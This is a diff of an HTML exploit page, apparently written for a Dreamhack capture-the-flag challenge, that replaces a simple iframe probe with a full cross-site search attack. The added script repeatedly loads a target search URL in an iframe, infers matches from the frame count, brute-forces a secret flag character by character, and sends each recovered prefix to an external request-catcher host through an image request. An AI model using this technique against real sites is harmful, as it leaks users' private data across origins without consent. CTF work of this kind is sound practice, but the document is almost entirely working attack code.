@@ -1,8 +1,44 @@
-<!doctype html>
-<html>
-  <body>
-    <!-- 공격자가 검사하고 싶은 문자열 -->
-    <iframe src="http://127.0.0.1:8000/search?query=DH{2" 
-            onload="new Image().src='https://nksurrb.request.dreamhack.games?hit=DH{2&num='+Date.now();"></iframe>
-  </body>
-</html>
+<iframe id="iframe"></iframe>
+<img id="img">
+<script>
+  async function req(url) {
+    return await new Promise((resolve, reject) => {
+      const iframe = document.getElementById("iframe");
+      iframe.src = url;
+      iframe.onload = () => {
+        if (iframe.contentWindow.frames.length != 0)
+          return resolve();
+        else
+          return reject();
+      };
+    });
+  }
+
+  async function search(query) {
+    try {
+      await req(
+        `http://host8.dreamhack.games:24008/search?query=${query}`
+      );
+      return true;
+    } catch (e) {
+      return false;
+    }
+  }
+
+  async function exploit() {
+    let chars = "0123456789abcdef}";
+    let secret = "DH{";
+
+    while (!secret.includes("}")) {
+      for (let c of chars) {
+        if (await search(secret + c)) {
+          secret += c;
+          img.src = `https://sigxwfm.request.dreamhack.games/${secret}`;
+          break;
+        }
+      }
+    }
+  }
+
+  exploit();
+</script>
